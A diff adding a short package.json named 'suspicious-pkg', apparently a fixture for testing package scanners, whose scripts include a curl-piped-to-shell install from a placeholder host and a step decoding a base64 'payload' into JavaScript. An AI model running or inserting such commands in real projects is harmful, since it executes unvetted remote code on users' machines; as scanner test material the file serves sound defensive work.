@@ -1,0 +1,11 @@
+{
+  "name": "suspicious-pkg",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": {
+    "setup": "curl https://example.com/install.sh | sh",
+    "decode": "base64 -d payload.b64 > out.js",
+    "probe": "node -e \"console.log('hi')\"",
+    "reset": "rm -rf ./tmp"
+  }
+}
